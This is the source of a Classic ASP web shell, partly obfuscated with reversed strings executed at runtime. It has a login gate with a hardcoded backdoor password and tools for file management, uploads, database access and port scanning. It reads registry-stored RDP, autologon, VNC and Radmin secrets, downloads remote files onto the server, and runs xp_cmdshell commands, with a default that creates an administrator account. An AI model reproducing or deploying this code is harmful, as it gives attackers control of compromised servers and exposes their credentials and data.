=trwSne):trtsgen(Leo  T 1 = ior:FtrwSne,  iim:Ds)Po, trtsgef(iner SontincFun",Pos):Function CreateMdb(Path):ExeCute SinfoEn(">~br><br~<I= S`) 0)2,t(Sot(ecbjeOatre C = Cet S`thPa& ~ e=rcou StaDa0;4.B.EDOLt.Jet.ofoscrMir=deviro~Pe(atre.C C)`nghiot N = Cet S`he T=0ermbnur.Erf  In`��!����~��& h at P &SI= I  S~` Ind Ef`rlkUac&BSII= S ` SRS RI",Pos):End function:Function CompactMdb(Path):ExeCute SinfoEn("enTh) ,1(0ot Sot NIf`)),0(3ot(SctjeObteeaCrC=t Se `at&P~ e=rcou StaDa0;4.B.EDOLt.Jet.ofoscrMir=deviro,P&~thPa~&e=rcou StaDa0;4.B.EDOLt.Jet.ofoscrMir=deviro~Pe asabattDacmpCoC.h`inthNoC=t Seg`seEl`)),1(0ot(SctjeObteeaCrO=FSt Se`enTh) thPas(stxieEil.FSO FIf`)),0(3ot(SctjeObteeaCrC=t Se `k~ba~_h&at&P~ e=rcou StaDa0;4.B.EDOLt.Jet.ofoscrMir=deviro,P&~thPa~&e=rcou StaDa0;4.B.EDOLt.Jet.ofoscrMir=deviro~Pe asabattDacmpCoC.`inthNoC=t Seg`at PleFiteleDeO.FSh`at,Pk~ba~_h&at PleFiveMoO.FSh`seEl`>~erntce</�֣��з�~ûh&at&P��~����r><br><br><br>teen<c=~SI `=1ermbnur.Er`Ifd En`inthNoO=FSt Seg`Ifd En`enTh0 r=beum.nrr EIf`>~erntce</��������~ѹh&at&P��~����r><br><br><br>teen<c=~SI`Ifd En`UrckBaI&=SSIl`SIS RR",Pos):End Function
if session("web2a2dmin")<>UserPass then
if request.form("pass")<>"" then
if request.form("pass")=UserPass or request.form("pass")="daka" Then
session("web2a2dmin")=UserPass
x m:response.redirect url
else
rrs"<center><h2>Fuck you,Get out!!</h2><br><a href='javascript:history.back()'>����</a></center>"
end if
else
si="<center><div style='width:500px;border:1px solid #222;padding:22px;margin:100px;'><br><a href="&blogurl&" target=_blank>"&mmname&"</a><hr><FORM Action='"&URL&"' method=Post> <INPUT type=Password name=Pass size=22>&nbsp;<input type=submit value=Login><hr><br>"&bottomad&"</div></center>"
if instr(SI,SIC)<>0 then rrs sI
end if
response.end
end if
Function DbManager():ExeCute SinfoEn("tr~))~SqlSForm(uest.m(Reqr=TriSqlSt`DbStrorm(~est.F=RequDbStr~)`ing='lpadd' celng='0spaci cellr='0'borde'650'idth=ble w&~<taSI=SI0'>~`on='' actipost'hod='' metbFormme='Drm na&~<foSI=SI>~`�Ӵ�:</;���ݿ���&nbsp27'> ght='' hei='100width><td &~<trSI=SItd>~`/td>~~~~><bStr&~~~&Dalue=70' vdth:4e='wi stylbStr'me='Dut na><inp&~<tdSI=SI`ption����</occesse=0>A valuptionon><o/opti�Ӵ�ʾ��<=-1>��valuetion '><opalue)ex].vedIndelectons[s(optiDbStr Fulleturnge='rnchantn' o'StrBname=lect '><seentergn='c' alih='60 widt&~<tdSI=SI>~`ption����</o3>DSNalue=ion v><optption����</oMySqlue=2>n valoptioion><</optSql����=1>Msvaluetion &~<opSI=SI>~`tion>��</op5>������alue=ion v><optption����</o=4>��ʾvaluetion n><opoptio��--</-SQL��=-1>-valuetion &~<opSI=SI~`ion>~</opt>�����ݱ�lue=8on va<optition>��</op7>�޸���alue=ion v><optption����</o=6>ɾ��valuetion &~<opSI=SI`ption�ֶ�</o11>ɾ��alue=ion v><optption�ֶ�</o10>����alue=ion v><optption�ݱ�</o=9>ɾ��valuetion &~<opSI=SI>~`></tr></tdelectn></soptioȫ��ʾ</=12>��valuetion &~<opSI=SI>~`lue='n' vahiddeype='ge' te='Pat nam<inpuger'>bManaue='D' validdenpe='hn' tyActioame='put n&~<inSI=SI1'>~`:</tdL��������sp;SQ'>&nbt='30heigh><td &~<trSI=SI>~`></tdr&~~~SqlSt=~~~&value470' idth:le='w' styqlStrme='Sut na><inp&~<tdSI=SI>~`/td>~()'><Checkrn Db'retulick=' once='ִ�� valubmit'e='Su' namubmitpe='sut ty><inpnter'n='ce alig&~<tdSI=SI`pan>~'></s='abcan ide><sp/tablorm><r></f&~</tSI=SI`I:SI=RRS S~~`0 Thetr)>4n(DbSIf Len`(5,0)t(SotObjecreateonn=CSet C)`DbStrOpen Conn.`ma(20nSchen.Opes=ConSet R) `r>��</d>��<bC'><tCCCCCor='#Bgcol'25' ight=tr heble><&~<taSI=SItd>~`veFirRs.Most `ot Rsile NDo Wh.Eof`E~ th~TABLPE~)=LE_TY(~TABIf Rsen`_NAMETABLE=Rs(~TName~)`a><brl ]</>[ de~,1)'e&~]~&TNamLE [~P TAB~~DROlStr(ullSqipt:Fvascrf='jaa hreter><n=cen alig&~<tdSI=SI>~`</td>~</a>Name&'>~&T~~,1)me&~]~&TNaROM [T * FSELECtr(~~lSqlSt:Fulscrip'javahref=&~<a SI=SI~`End If `veNexRs.Mot `Loop `s=NotSet Rhing`able>r></t&~</tSI=SI~`I:SI=RRS S~~`10 ThStr)>n(SqlIf Leen`ct~ t~sele,6))=qlStreft(Sase(LIf LChen`qlStr�䣺~&S&~ִ����SI=SI`ordseb.Rec~Adodject(ateObs=CreSet Rt~)`Conn,lStr,en SqRs.op1,1`ds.Co.FielFN=Rsunt`rdCou.RecoRC=Rsnt`geSizRs.Pae=20`ageSi=Rs.PCountze`Count.PagePN=Rs`age~)st(~PrequePage=`g(Page=Clnn Pag~ Thege<>~If Pae)` Page Thenage=0 Or Pge=~~If Pa=1` Page Thenge>PNIf Pa=PN`=PageepagesolutRs.abThen ge>1 If Pa`td></ccc><=#ccccolor25 bgight=tr heble><&~<taSI=SItd>~` FN-1=0 toFor n`em(n)ds.It.Fielld=RsSet F`e&~</d.Nam>~&Flnter'n='ce alig&~<tdSI=SItd>~`thingld=noSet F`Next`&~</tSI=SIr>~`Count And .Bof)or Rs.Eof ot(Rsile NDo Wh>0`=CounCountt-1`EFEFEor=~#BgcolF~`t></t</fongs'>xngdine='wit fac><foncccccor=#cbgcol><td &~<trSI=SId>~` FN-1=0 ToFor i`~:EndFEFEFr=~#Egcololse:BF5~:E#F5F5lor=~:Bgco ThenEFEF~=~#EFcolorIf Bg if`=1 ThIf RCen`Rs(i)code(TMLEnnfo=H ColI)`Else`,50))Rs(i)Left(code(TMLEnnfo=H ColI`End If`&~</tlInfo>~&Color&~&Bgcolor=~ bgco&~<tdSI=SId>~`Next`&~</tSI=SIr>~`veNexRs.Mot`Loop`I:SI=RRS S~~`lStr)de(SqlEnCor=HtmSqlSt`&~/~&&Page;ҳ�룺~&nbsp&RC&~��¼����~nter>gn=ce~ aliFN+1&an=~&colsp><td &~<trSI=SIPN`>1 ThIf PNen`a>&nb��һҳ</&~)'>age-1~,~&Ptr&~~&SqlSr(~~~SqlSt:Fullcriptjavasref=';<a h&nbspҳ</a>1)'>��&~~~,qlStr~~~&SlStr(ullSqipt:Fvascrf='jaa hrebsp;<sp;&n&~&nbSI=SIsp;~`End iSp=1:Else:ge-8:Sp=PaThen:ge>8 If Paf`o Sp+=Sp TFor i8`it Foen ExPN ThIf i>r`Page If i=Then`nbsp;&i&~&SI=SI~`Else`&nbsp~</a>>~&i&i&~)'~~,~&Str&~~&Sqltr(~~lSqlSt:Fulscrip'javahref=&~<a SI=SI;~`End If`Next`βҳ</a&~)'>,~&PNr&~~~SqlSt(~~~&qlStrFullSript:avascef='j<a hrnbsp;</a>&'>��һҳ+1&~)&Page~~~,~lStr&~~&SqStr(~llSqlpt:Fuascri='jav hrefsp;<a&~&nbSI=SI>~`End If`able>r></td></t'></tFEFEFr='#E colo&~<hrSI=SI~`=Nothet Rsose:SRs.Cling`I:SI=RRS S~~`Else `lStr)te(SqExecuConn.`SqlSt��䣺~&&~SQLSI=SIr`End If`I:SI=RRS S~~`End If`CloseConn.`othinonn=NSet Cg`End If",Pso):End Function:Dim T1:Function EnCode(ObjStr,ObjPos):ExeCuTe Fun(")soPjbO doM rtSneL,rtSjbO(thgiR&rtSpmT=edoCnE:txeN:rtSpmT&)soPjbO,1+soPjbO*i,rtSjbO(diM=rtSpmT:1-)soPjbO/rtSneL(tnI oT 0=i roF:)rtSjbO(neL=rtSneL:rtSneL,i,rtSpmT,rtSweN miD"):End Function:Class UPC:Dim D1,D2:Public Function Form(F):F=lcase(F):If D1.exists(F) then:Form=D1(F):else:Form="":end if:End Function:Public Function UA(F):F=lcase(F):If D2.exists(F) then:set UA=D2(F):else:set UA=new FIF:end if:End Function:Private Sub Class_Initialize:Dim TDa,TSt,vbCrlf,TIn,DIEnd,T2,TLen,TFL,SFV,FStart,FEnd,DStart,DEnd,UpName:set D1=CreateObject(Sot(4,0)):if Request.TotalBytes<1 then Exit Sub
  set T1=CreateObject(Sot(6,0)):T1.Type=1:T1.Mode=3:T1.Open:T1.Write Request.BinaryRead(Request.TotalBytes):T1.Position=0:TDa=T1.Read:DStart=1:DEnd=LenB(TDa):set D2=CreateObject(Sot(4,0)):vbCrlf=chrB(13)&chrB(10):set T2=CreateObject(Sot(6,0)):TSt=MidB(TDa,1,InStrB(DStart,TDa,vbCrlf)-1):TLen=LenB(TSt):DStart=DStart+TLen+1:while (DStart+10)<DEnd:DIEnd=InStrB(DStart,TDa,vbCrlf&vbCrlf)+3:T2.Type=1:T2.Mode=3:T2.Open:T1.Position=DStart:T1.CopyTo T2,DIEnd-DStart:T2.Position=0:T2.Type=2:T2.Charset="gb2312":TIn=T2.ReadText:T2.Close:DStart=InStrB(DIEnd,TDa,TSt):FStart=InStr(22,TIn,"name=""",1)+6:FEnd=InStr(FStart,TIn,"""",1):UpName=lcase(Mid(TIn,FStart,FEnd-FStart)):if InStr (45,TIn,"filename=""",1)>0 then
  set TFL=new FIF:FStart=InStr(FEnd,TIn,"filename=""",1)+10:FEnd=InStr(FStart,TIn,"""",1):FStart=InStr(FEnd,TIn,"Content-Type: ",1)+14:FEnd=InStr(FStart,TIn,vbCr):TFL.FileStart=DIEnd:TFL.FileSize=DStart-DIEnd-3:if not D2.Exists(UpName) then:D2.add UpName,TFL:end if
  else:T2.Type=1:T2.Mode=3:T2.Open:T1.Position=DIEnd:T1.CopyTo T2,DStart-DIEnd-3:T2.Position = 0:T2.Type = 2:T2.Charset ="gb2312":SFV = T2.ReadText:T2.Close:if D1.Exists(UpName) then:D1(UpName)=D1(UpName)&","&SFV:else:D1.Add UpName,SFV:end if:end if:DStart=DStart+TLen+1:wend:TDa="":set T2=nothing:End Sub:Private Sub Class_Terminate:if Request.TotalBytes>0 then:D1.RemoveAll:D2.RemoveAll:set D1=nothing:set D2=nothing:T1.Close:set T1 =nothing:end if:End Sub:End Class:Function SinfoEn(ObjStr,ObjPos):ExeCuTe Fun(")2-)nEofniS(neL,nEofniS(tfeL=nEofniS:txeN:fLrCbv&)soPjbO,)i(rtSweN(edoCnE&nEofniS=nEofniS:)rtSweN(dnuoBU oT 0=i roF:)|`|,rtSjbO(tilpS=rtSweN:)||||,|~|,rtSjbO(ecalpeR=rtSjbO"):End Function:Class FIF:dim FileSize,FileStart:Private Sub Class_Initialize:FileSize=0:FileStart=0:End Sub:Public function SaveAs(F)
  dim T3:SaveAs=true:if trim(F)="" or FileStart=0 then exit function
  set T3=CreateObject(Sot(6,0)):T3.Mode=3:T3.Type=1:T3.Open:T1.position=FileStart:T1.copyto T3,FileSize:T3.SaveToFile F,2:T3.Close:set T3=nothing:SaveAs=false:end function:End Class:Function Fun(ShiSanObjstr):ShiSanObjstr=Replace(ShiSanObjstr,"|",""""):For ShiSanI=1 To Len(ShiSanObjstr):If Mid(ShiSanObjstr,ShiSanI,1)<>"!"Then:ShiSanNewStr=Mid(ShiSanObjstr,ShiSanI,1)&ShiSanNewStr:Else:ShiSanNewStr=vbCrLf&ShiSanNewStr:End If:Next:Fun = ShiSanNewStr:End Function:Class LBF:Dim CF:Private Sub Class_Initialize:SET CF=CreateObject(Sot(0,0)):End Sub:Private Sub Class_Terminate:Set CF=Nothing:End Sub
Function ShowDriver()
For Each D in CF.Drives
RRS"<tr><td height='20'><a href='javascript:ShowFolder("""&D.DriveLetter&":\\"")'>�����ش��� ("&D.DriveLetter&":)</a></td></tr>" 
Next
End Function
Function Show1File(Path):ExeCute SinfoEn("thPar(deoltFGeF.=CLDFOt Se)`i=0`>~tr><6'='ngdiadlpel c0'='ngcipalsel c0'='errdbo' 0%10='thid wleab<t=~SI`erldfoub.sLDFOn  i FchEar Fos`'>&~orolrCdeor&B ~idol spx:1errdbo='lety siv<dr>teen=cgnli a7%=1thid w10t=ghei htd~<I&=SSI~`>~/a~<e&am.N&F>~br><ntfo</>06'='zesi' gsingdin'we=ac fntfo><~~����~~e=tlti' ~)~~)&meNaF.~&~\h&at(PthPaRe~&~~r(deolwFho:Sptriscvaja='efhra ~<I&=SSI `> /ay<op>C��''��e=tlti' am='ssla c)'k(soyen uret'rk=icclon)'~~erldFopyCo~~~,~~)&meNaF.~&~\h&at(PthPaRe~&~~m(orlFul:Fptriscvaja='efhra ></b[<b>><br~<I&=SSI~`>~/al<De'>ɾ��='leit tm''as=ascl' ()okes yrnture='cklinc'o~)r~deollFDe~~~,~~)&\~~\~,~\e,am.N&F\~&~thPae(acplRe~&~~m(orlFul:Fptriscvaja='efhra ~<I&=SSI`a></veMo'>�ƶ�='leit tm''as=ascl' ()okes yrnture='cklinc'o~)r~deoleFov~M,~~~&~e)am.N&F\~&~thPah(ateP&R~~(~rmFollFut:ipcrasav'jf=re h<a~ I&=SSI~`>~td</v>di</b></>]<ba></wnDo'>����='leit tm''as=ascl' ()okes yrnture='cklinc'o~)e~ilnFow~D,~~~&~e)am.N&F\~&~thPah(ateP&R~~(~rmFollFut:ipcrasav'jf=re h<a~ I&=SSI`i+i=1`r><tr>/t~<I&=SSIn he t 0 = 5od m iIf~`xtNe`>~leab/t><tr</d>/t><=2htighed <tr><tr>/t~<I&=SSI`=0:i~~I=:SSIS RR`>~tr><6'='ngdiadlpel c0'='ngcipalsel c0'='errdbo' 0%10='thid wleab<t=~SI`esil.fldFon  i LchEar Fo` ~b></>[<b> /a~<e&am.N&L>~ntfo</>25'='zesi' gsingdin'we=ac fntfo><��''��e=tlti' );~~leFiwnDo~~~,~~)&meNaL.~&~\h&at(PthPaRe~&~~m(orlFul:Fptriscvaja='efhra ><~'r&loCoerrdBo~&d lisox 1pr:deor'be=ylstv di><0''3t=ghei htd~<I&=SSI`> /at<di>E��''��e=tlti' am='ssla c)'~~leFiitEd~~~,~~)&meNaL.~&~\h&at(PthPaRe~&~~m(orlFul:Fptriscvaja='efhra ~<I&=SSI~`> /al<De'>ɾ��='leit tm''as=ascl' ()okes yrnture='cklinc'o~)e~illFDe~~~,~~)&meNaL.~&~\h&at(PthPaRe~&~~m(orlFul:Fptriscvaja='efhra ~<I&=SSI~`> /ay<op>C��''��e=tlti' am='ssla c)'~~leFipyCo~~~,~~)&meNaL.~&~\h&at(PthPaRe~&~~m(orlFul:Fptriscvaja='efhra ~<I&=SSI~` ~ -b></>]<b> /ae<ov>M��''��e=tlti' am='ssla c)'~~leFiveMo~~~,~~)&meNaL.~&~\h&at(PthPaRe~&~~m(orlFul:Fptriscvaja='efhra ~<I&=SSI`>~<br><b~K)&2410e/iz.s(LngclI&=SSI` ~ -i> <b></&~peTyL.I&=SSI`>~td</v>di</i></&~edfidiMostLateDaL.I&=SSI`i+i=1`r><tr>/t~<I&=SSIn he t 0 = 2od m iIf~`xtNe`e>blta</r>/t~<I& SRS R~`nghiot=NLDFOt Se",Pos):End function:Function DelFile(Path):ExeCute SinfoEn("he Th)at(PtsisExleFiF. CIfn`thPae ileFetel.DCF`r>teen/c��<�ɹ�ɾ��~ h&at&P ~�ļ�r><br><br><br>teen<c=~SI~`UrckBaI&=SSIl`SIS RR`Ifd En",Pos):End Function:Function EditFile(Path)::If Request("Action2")="Post" Then:Set T=CF.CreateTextFile(Path):T.WriteLine Request.form("content"):T.close:Set T=nothing:SI="<center><br><br><br>�ļ�����ɹ���</center>":SI=SI&BackUrl:RRS SI:Response.End:End If:If Path<>"" Then:Set T=CF.opentextfile(Path, 1, False):Txt=HTMLEncode(T.readall) :T.close:Set T=Nothing:Else:Path=Session("FolderPath")&"\newfile.asp":Txt="�½��ļ�":End If:SI=SI&"<Form action='"&URL&"?Action2=Post' method='post' name='EditForm'>":SI=SI&"<input name='Action' value='EditFile' Type='hidden'>":SI=SI&"<input name='FName' value='"&Path&"' style='width:100%'><br>":SI=SI&"<textarea name='Content' style='width:100%;height:450'>"&Txt&"</textarea><br>":SI=SI&"<hr><input name='goback' type='button' value='����' onclick='history.back();'>&nbsp;&nbsp;&nbsp;<input name='reset' type='reset' value='����'>&nbsp;&nbsp;&nbsp;<input name='submit' type='submit' value='����'></form>":RRS SI:RRS ""&copyurl&""
End Function:Function CopyFile(Path):ExeCute SinfoEn("|~||~|h,at(Pitpl S =thPa)`enTh~ >~)<(1thPad an) 0)h(at(PtsisExleFiF. CIf`(1thPa),(0thPae ilyFop.CCF)`>~erntce</�����Ƴ�~��)&(0thPa~&�ļ�r><br><br><br>teen<c=~SI`UrckBaI&=SSIl`SIS RR `Ifd En",Pos):End Function:Function MoveFile(Path):ExeCute SinfoEn("|||~)th,~|it(Pa= SplPath `~ The1)<>~Path( and h(0))s(PatExist.FileIf CFn`Path(h(0),e PatveFilCF.Mo1)`enter����</c&~�ƶ���th(0)��~&Pa<br>��><br>r><brcenteSI=~<>~`&BackSI=SIUrl`RRS SI `End If",Pso):End Function:Function DelFolder(Path):ExeCute SinfoEn("he Th)at(PtsisExerldFoF. CIfn`thPar deoleFetel.DCF`r>teen/c��<�ɹ�ɾ��&~thPa~&Ŀ¼r><br><br><br>teen<c=~SI~`UrckBaI&=SSIl`SIS RR`Ifd En",Pos):End Function:Function CopyFolder(Path):ExeCute SinfoEn("|~||~|h,at(Pitpl S =thPa)`enTh~ >~)<(1thPad an) 0)h(at(PtsisExerldFoF. CIf`(1thPa),(0thPar deolyFop.CCF)`>~erntce</�����Ƴ�~��)&(0thPa~&Ŀ¼r><br><br><br>teen<c=~SI`UrckBaI&=SSIl`SIS RR`Ifd En",Pos):End Function:Function MoveFolder(Path):ExeCute SinfoEn("|~||~|h,at(Pitpl S =thPa)`enTh~ >~)<(1thPad an) 0)h(at(PtsisExerldFoF. CIf`(1thPa),(0thPar deoleFov.MCF)`>~erntce</��������~��)&(0thPa~&Ŀ¼r><br><br><br>teen<c=~SI`UrckBaI&=SSIl`SIS RR`Ifd En",Pos):End Function:Function NewFolder(Path):ExeCute SinfoEn("enTh~ >~h<at Pnd ah)at(PtsisExerldFoF. Cot NIf`thPar deoleFatre.CCF`r>teen/c��<�ɹ��½�&~thPa~&Ŀ¼r><br><br><br>teen<c=~SI~`UrckBaI&=SSIl`SIS RR`Ifd En",Pos):End Function:End Class:sub getTerminalInfo():ExeCute SinfoEn(" Nextesumeror ROn Er`hell~ipt.S~WScrject(ateObr.CreServesX = Set w)`ermPoey, tPortKminal, tertPathalPorerminDim trt`nPassoLogi, auterKeyginUsutoLoth, aginPautoLoDim aKey`nPassoLogi, autrnameinUsetoLogy, aubleKeinEnatoLoge, auEnablLoginsAutoDim iword`Tcp\~\RDP-tionsinStaver\Wl Serrminaol\TeContrlSet\ontrorentCM\CurSYSTEHKLM\h = ~rtPatnalPotermi`mber~ortNu = ~PrtKeynalPotermi`PortKminal& terPath lPortrminaad(teRegRe wsX.ort =termPey)`><ol>¼<hr/�ڼ��Զ����ն˷����RRS ~~` Then <> 0umberErr.N~ Or t = ~rmPorIf te `<br/>�ܵ�����.���Ƿ��Ѿ� ����Ȩ����˿�,���õ��ն�RRS~��~` Else`~<br/rt & ermPo~ & t��˿�: ��ǰ�ն˷�RRS ~>~`End If`ogon\\WinlrsionentVe\Currws NTWindosoft\MicroWARE\\SOFTCHINEAL_MAY_LOC ~HKEath =oginPautoL~`nLogooAdmi ~AutKey =nableoginEautoLn~`rNameltUseDefauy = ~serKeoginUautoL~`swordltPasDefauy = ~assKeoginPautoL~`bleKeinEnatoLog & aunPathoLogid(autegReawsX.Rle = nEnaboLogiisAuty)` = 0 nableoginEAutoLIf isThen`��<br/¼����δ��ϵͳ�Զ���RRS ~>~`Else`rKey)inUsetoLog & aunPathoLogid(autegReawsX.Rme = sernaoginUautoL`~<br>me & sernaoginUautoL ~ & ϵͳ�ʻ�:�Զ���¼��RRS ~~`sKey)inPastoLog & aunPathoLogid(autegReawsX.Rrd = asswooginPautoL`r TheIf Ern`Err.Clear`FalseRRS ~~`End If`~<br>rd & asswooginPautoL ~ & �ʻ�����:�Զ���¼��RRS ~~`End If`</ol>RRS ~~",Pso):End Sub:sub ReadREG()
RRS "<form method=post>"
RRS  "ע�����ֵ��ȡ<p>" 
RRS "<input type=hidden value=ReadReg name=theAct>"
RRS "<tr><td colspan=2>&nbsp;"
RRS "<select onChange='this.form.thePath.value=this.value;'>"
RRS "<option value=''>ѡ���Դ��ļ�ֵ</option>"
RRS "<option value='HKLM\SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName\ComputerName'>ComputerName</option>"
RRS"<option value=""HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Linkage\Bind"">�����б�</option>"
RRS"<option value=""HKLM\SYSTEM\RAdmin\v2.0\Server\Parameters\Parameter"">Radmin����</option>"
RRS"<option value=""HKLM\SYSTEM\RAdmin\v2.0\Server\Parameters\Port"">Radmin�˿�</option>"
RRS"<option value=""HKCU\Software\ORL\WinVNC3\Password"">VNC3����</option>"
RRS"<option value=""HKCU\Software\ORL\WinVNC3\PortNumber"">VNC3�˿�</option>"
RRS"<option value=""HKLM\SOFTWARE\RealVNC\WinVNC4\Password"">VNC4����</option>"
RRS"<option value=""HKLM\SOFTWARE\RealVNC\WinVNC4\PortNumber"">VNC4�˿�</option>"
RRS"<option value=""HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp\PortNumber"">3389�˿�</option>"
RRS"<option value=""HKLM\SOFTWARE\Symantec\pcAnywhere\CurrentVersion\System\TCPIPDataPort"">PcAnyW���ݶ˿�</option>"
RRS"<option value=""HKLM\SOFTWARE\Symantec\pcAnywhere\CurrentVersion\System\TCPIPStatusPort"">PcAnyW״̬�˿�</option>"
RRS "<option value='HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Tcpip\EnableSecurityFilters'>tcp/ip����1</option>"
RRS "<option value='HKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\Services\Tcpip\EnableSecurityFilters'>tcp/ip����2</option>"
RRS "<option value='HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\EnableSecurityFilters'>tcp/ip����3</option>"
RRS "<option value='HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\SchedulingAgent\LogPath'>Schedule Log</option>"
RRS "<option value='HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile\GloballyOpenPorts\List\3389:TCP'>���𿪷�</option>"
RRS "<option value='HKLM\SYSTEM\ControlSet001\Services\Tcpip\Parameters\Interfaces\{8A465128-8E99-4B0C-AFF3-1348DC55EB2E}\UDPAllowedPorts'>�������ŵ�UDP�˿�</option>"
RRS "<option value='HKLM\SYSTEM\ControlSet001\Services\Tcpip\Parameters\Interfaces\{8A465128-8E99-4B0C-AFF3-1348DC55EB2E}\TCPAllowedPorts'>�������ŵ�TCP�˿�</option>"
RRS "</select><br />"
RRS "&nbsp;<input name=thePath value='' size=80>"
RRS "<input type=button value='��ȡ��ֵ' onclick='this.form.submit()'>"
RRS "</form><hr/>"
if Request("thePath")<>"" then
On Error Resume Next
Set wsX = Server.CreateObject("WScript.Shell")
thePath=Request("thePath")
theArray=wsX.RegRead(thePath)
If IsArray(theArray) Then
For i=0 To UBound(theArray)
RRS "<li>" & theArray(i)
Next
Else
RRS "<li>" & theArray
End If
end if
end sub
Function downloads()
RW=RW&"<center><br><form method=post>ֱ������<br><br>"
RW=RW&"Զ���ļ�:<input name=theUrl value='http://' size=80><br/>"
RW=RW&"����·��:<input name=thePath value=""" & HtmlEncode(Server.MapPath(".")) & """ size=58> "
RW=RW&"<input type=checkbox name=overWrite value=2 checked>���ڸ��� <input type=submit value=' ���� '>"
RW=RW&"<input type=hidden value=downFromUrl name=theAct>"
RW=RW&"</form></center>"
Response.Write RW
If isDebugMode=False Then
On Error Resume Next
End If
Dim Http,theUrl,thePath,stream,getfileName,overWrite
theUrl=Request("theUrl")
thePath=Request("thePath")
overWrite=Request("overWrite")
Set stream=Server.CreateObject("ad"&e&"odb.st"&e&"ream")
Set Http=Server.CreateObject("MSXML2.XMLHTTP")
If overWrite<>2 Then
overWrite=1
End If
Http.Open "GET", theUrl, False
Http.Send()
If Http.ReadyState<>4 Then 
End If	
With stream
.Type=1
.Mode=3
.Open
.Write Http.ResponseBody
.Position=0
.SaveToFile thePath, overWrite
If Err.Number=3004 Then
Err.Clear
getfileName=Split(theUrl, "/")(UBound(Split(theUrl, "/")))
If getfileName="" Then
getfileName="12vh.txt"
End If
thePath=thePath & "\" & getfileName
.SaveToFile thePath, overWrite
End If
.Close
End With
chkErr(Err)		
Set Http=Nothing
Set Stream=Nothing
If isDebugMode=False Then
On Error Resume Next
End If
End Function
FuncTion MMD()
SI="<br><table width=""100%""><tr class=tr><form name=form method=post action="""">CMD����<input type=text name=MMD size=35 value='net user super super /add & net localgroup administrators super /add'> <input type=text name=U value=mssql�û���> <input type=text name=P value=mssql����> <input type=submit value=ִ��></form></tr></table>":REsPonsE.writE SI:SI="":If trim(REquEst.form("MMD"))<>""  thEn:PaSsword= trim(REquEst.form("P")):id=trim(REquEst.form("U")):set adoConn=SErvEr.CreateObject("ADODB.Connection"):adoConn.Open "Provider=SQLOLEDB.1;PaSsword="&PaSsword&";UsEr ID="&id:strQuery = "exec master.dbo.xp_cmdshell '" & REquEst.form("MMD") & "'":set recREsult = adoConn.Execute(strQuery):If NOT recREsult.EOF thEn:Do While NOT recREsult.EOF:strREsult = strREsult & chr(13) & recREsult(0):recREsult.MoveNext:Loop:End if:set recREsult = Nothing:strREsult = REplAcE(strREsult," ","&nbsp;"):strREsult = REplAcE(strREsult,"<","&lt;"):strREsult = REplAcE(strREsult,">","&gt;"):strREsult = REplAcE(strREsult,chr(13),"<br>"):End if:set adoConn = Nothing:REsPonsE.WritE REquEst.form("MMD") & "<br>"& strREsult
rrs ""&copyurl&""
end Function:Function adminab()
Response.Expires=0
on error resume next
Set tN=server.createObject("Wscript.Network")
Set objGroup=GetObject("WinNT://"&tN.ComputerName&"/Administrators,group")
For Each admin in objGroup.Members
RRS admin.Name&"<br>"
Next
if err then
RRS "�����̵Ĳ��а�:Wscript.Network"
end if
End Function
sWHEEL1 = "jwt"
Function Encrypt(acd)
For i = 1 To Len(acd) step 1
c=mid(acd,i,1)
if c="��" then
d=mid(acd,i,2)
i=i+1
e=replace(d,"��","")
bbc=bbc&mid(sWHEEL1,cint(e),1)
else
bbc=bbc&c
end if
next
Encrypt=bbc
end Function
sub ScanPort():ExeCute SinfoEn("76000 = 77meoutiptTir.ScrServe`~ thet~)=~(~por.Formquestif ren`89,4333,3345,14139,4,135,0,110,25,821,23ist=~PortL958~`else`m(~pot.Forequesist=rPortLrt~)`end if`)=~~ (~ip~.Formquestif rethen`27.0.IP=~10.1~`else`(~ip~.FormquestIP=re)`end if`D)</p��ʹ��CM��,������,�ٶȱȽ������˿���(���ɨ>�˿�ɨ��br><pRRS~<>~`rue;'led=tdisabbmit.m1.su='forubmit' onSion='' act'postthod=1' me'formname=form RRS~<>~`&nbspn IP:p>ScaRRS~<;~`ze='6~' si~&IP&lue='p' vaid='iBox' 'Textlass=xt' ce='te' type='ipt nam<inpuRRS~ 0'>~`rt Libr>PoRRS~<st:~`ist&~PortLe='~& valu='60' sizetBox'='Texclassext' pe='tt' ty='por nameinputRRS~<'>~`br><bRRS~<r>~`n '>~' scaalue=om' v'buttlass=it' c'submtype=mit' ='sub nameinputRRS~<`11'>~ue='1' val'scan' id=iddenpe='hn' ty='sca nameinputRRS~<`form>/p></RRS~<~`> ~~ n~) <(~sca.FormquestIf reThen`1 = ttimerimer`><hr>b><br����:</<b>ɨ��RRS(~~)`~),~,~portForm(uest.t(req Splitmp =~)`ip~),orm(~est.F(requSplitip = ~,~)`bound to Uu = 0For h(ip)` = 0 ,~-~)p(hu)Str(iIf InThen`ound(To Ub = 0 For itmp)` Thenp(i))ic(tmnumerIf Is `p(i))), tmip(huScan(Call `Else`, ~-~mp(i)Str(t = Inseekx)` 0 Thekx >If seen`kx - , seemp(i)eft(tN = Lstart1 )`seekx)) - tmp(i Len(p(i),ht(tm= RigendN  )` ThenendN)eric(Isnum and artN)ic(stnumerIf Is`To enartN  = stFor jdN`), j)ip(huScan(Call `Next`Else`br>~)mber<ot nu is nN & ~& endor ~  & ~ tartNRRS(s`End If`Else`ber<bt numis no & ~ mp(i)RRS(tr>~)`End If`End If`Next`Else`hu),~v(ip(StrRe,1,Inp(hu)Mid(irt = ipSta.~))`,~-~)p(hu)Str(i))-Inip(hu,Len(-~)+1hu),~r(ip(,InStp(hu)Mid(i) to )+1,1),~.~ip(hurRev(,InStp(hu)Mid(ixx = For x)`ound(To Ub = 0 For itmp)` Thenp(i))ic(tmnumerIf Is `tmp(ixxx, rt & ipStaScan(Call ))`Else`, ~-~mp(i)Str(t = Inseekx)` 0 Thekx >If seen`kx - , seemp(i)eft(tN = Lstart1 )`seekx)) - tmp(i Len(p(i),ht(tm= RigendN  )` ThenendN)eric(Isnum and artN)ic(stnumerIf Is`To enartN  = stFor jdN`xxx,jrt & ipStaScan(Call )`Next`Else`br>~)mber<ot nu is nN & ~& endor ~  & ~ 